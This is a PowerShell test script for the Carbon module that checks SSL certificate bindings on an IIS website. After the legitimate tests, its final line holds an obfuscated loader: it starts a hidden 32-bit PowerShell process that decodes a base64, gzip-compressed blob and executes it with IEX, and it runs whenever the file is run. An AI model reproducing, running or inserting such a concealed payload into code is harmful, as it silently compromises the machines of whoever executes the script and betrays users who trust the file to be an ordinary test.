











$siteName = 'Carbon-Set-IisWebsiteSslCertificate'
$cert = $null
$appID = '990ae75d-b1c3-4c4e-93f2-9b22dfbfe0ca'
$ipAddress = '43.27.98.0'
$port = '443'
$allPort = '8013'

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Start-Test
{
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings @( "https/$ipAddress`:$port`:", "https/*:$allPort`:" )
    $cert = Install-Certificate -Path (Join-Path $TestDir ..\Certificates\CarbonTestCertificate.cer -Resolve) -StoreLocation LocalMachine -StoreName My
}

function Stop-Test
{
    Uninstall-Certificate -Certificate $cert -StoreLocation LocalMachine -StoreName My
    Uninstall-IisWebsite -Name $siteName
}

function Test-ShouldSetWebsiteSslCertificate
{
    Set-IisWebsiteSslCertificate -SiteName $siteName -Thumbprint $cert.Thumbprint -ApplicationID $appID
    try
    {
        $binding = Get-SslCertificateBinding -IPAddress $ipAddress -Port $port
        Assert-NotNull $binding
        Assert-Equal $cert.Thumbprint $binding.CertificateHash
        Assert-Equal $appID $binding.ApplicationID
        
        $binding = Get-SslCertificateBinding -Port $allPort
        Assert-NotNull $binding
        Assert-Equal $cert.Thumbprint $binding.CertificateHash
        Assert-Equal $appID $binding.ApplicationID
        
    }
    finally
    {
        Remove-SslCertificateBinding -IPAddress $ipAddress -Port $port 
        Remove-SslCertificateBinding -Port $allPort
    } 
}

function Test-ShouldSupportWhatIf
{
    $bindings = @( Get-SslCertificateBinding )
    Set-IisWebsiteSslCertificate -SiteName $siteName -Thumbprint $cert.Thumbprint -ApplicationID $appID -WhatIf
    $newBindings = @( Get-SslCertificateBinding )
    Assert-Equal $bindings.Length $newBindings.Length
}

function Test-ShouldSupportWebsiteWithoutSslBindings
{
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings @( 'http/*:80:' )
    $bindings = @( Get-SslCertificateBinding )
    Set-IisWebsiteSslCertificate -SiteName $siteName -Thumbprint $cert.Thumbprint -ApplicationID $appID
    $newBindings = @( Get-SslCertificateBinding )
    Assert-Equal $bindings.Length $newBindings.Length
}


if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAAsjWFgCA7VWbW/aSBD+nEr9D1aFZFslGAhNmkiVbm3zlgABHEyAQ9XGXpuFtZfaa956/e83BtzSNrnrVToL5N2d2d2ZZ56ZsZeEjqA8lPjHS7dS3kmfX7866+IIB5KSo6W55ybDvJRbbdxrP7yqq2dnIM+tqGhJHyRlgpZLkweYhtObGyOJIhKKw7xQJwLFMQmeGCWxokp/ScMZicj5/dOcOEL6LOU+FuqMP2F2VNsa2JkR6RyFbiprcQenhhWsJaNCkf/8U1Yn56VpofopwSxWZGsbCxIUXMZkVfqiphc+bJdEkdvUiXjMPVEY0vCiXBiEMfZIB05bkTYRM+7GsgpewC8iIolCae9PesBBrMgw7EbcQa4bkRi0C81wxRdEyYUJY3npD2VyvL2fhIIGBOSCRHxpkWhFHRIXGjh0GekTb6p0yDpz+lc3KaebQKsrIjUP8XjGzDZ3E0YOO2X1Z0OzGKrwnMYRAPjy+tXrV97X+M+dj/w0+jA6m+zHBMxUujyme8UPUjEvteFCLHi0hWnuIUqIOpUmKfyT6VTKRa1L47a3zb98RCnTB+0nt/UeliY2p+4UthxjkyOrVmjol09huZ+KX6aaSTwaEnMb4oA6GZuU54AnHiN7dwuZWgdsU+SjgLgmYcTHIoUyL01+3lYNqPi6V08oc0mEHAheDFZBXNXvjTlER5GbYZsEgNZhLkMgPOAwybSPvN1mt6dzUJINhuM4L3UTSCInL1kEM+LmJRTG9ChCieD7ofzN3HbCBHVwLLLjpuoPcB6vNXgYiyhxII4AwYO1JA7FLEUkLzWoS/StRf3sevlZPAzMGA19OGkF8YCVFAdLpOyIwNKMCWrBIqIZLBkJQG2f1zWGfcjiYy7sGYV94sov2JpR/sDvFJwMlRNLIeIW4yIv2TQSUCVSoFN2/bYhJyXi1CQjIscoKVkeTfStSMmfo7V1wDvX5s7bk/oI2R6gSAA4tYgHOo7JZcUSEUCnvNHuqYHgGTVD1nb0BS2hNS012/Af0IsmN6/cu9t5Q4vMzcxDzbjZbnTNXqNRWd1adkVY1aa46zZFu/o4n1uo0R+MxLiJGg+0uBhVdstburNayB1ttMudvlsX9c1u7rveyPQ8/8qz+qV3NdoaGj29WMYts5q0hvpaL1biKl03enTQW9zWxNPIZnjgaf5j6RrTTSua2yXe3jURqs8unN2tZ9dnbXc7amjXw8oCVREywqpd0/ndSI9QV7Oxb3OU3C06gQ++YoOScW9Q03u9mo4G9fkn81rzYe8jnulDu0zHy8f+DOY1MOFOK1aaLtnxUQ9AqnOE/T7o+EbZmXmgY75F+tsOj8t4oXOkg05t/AnsGi1rXQbyh0GZI5t1HjFqjbc1TSuNuhXUKNJh3UfpkdjXexjFK3NnaiXb5e7wXWfkafYju9JM42HpeJqmrRvmnTMubd7fX71vDakdcDTQNPtNyhKgSY5dX+CTeL9U4ts4imeYAQ+gdmf5WeNR7ViGu5ymOxQla8cLEoWEQReDPpfRGjHGnbQhHGo2dKNDj5hCig5geFF+dqRKXxXVb50iW7q5GYOlkCknBC60SOiLWb64uSgWoeoXN5UiOPzrThp8uVVOT8ynzWMP1g83sf1NappKOez4OOj+72ges3gGL/df0fy29g/SX0K4mD/4/9Py9wv/CeffcX+IqQBlC2oQI4c++QIKR/qcfF0cIgS88I5P+n13n4jzDnx2/A2/DPsrUwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

